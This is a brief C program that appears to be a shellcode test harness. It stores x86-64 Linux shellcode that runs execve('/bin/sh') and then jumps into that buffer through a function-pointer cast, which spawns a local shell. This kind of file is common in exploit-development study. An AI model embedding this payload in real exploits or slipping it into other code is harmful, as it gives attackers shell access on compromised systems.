#include <stdio.h>
#include <string.h>
  const char code[] = "\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xd2\x48\x31\xc0\x48\x31\xf6\xb0\x3b\x0f\x05";
void main() {
//   FILE *fp;
//   fp = fopen("a.txt", "rb");
//   printf("%s\n", "xx");
//   fread(&code, 255, 1, fp);
//   printf("%s\n", code);
  // printf("Shellcode Length:  %d\n", strlen(code));

 (*(void(*)()) code)();
  //ret();
}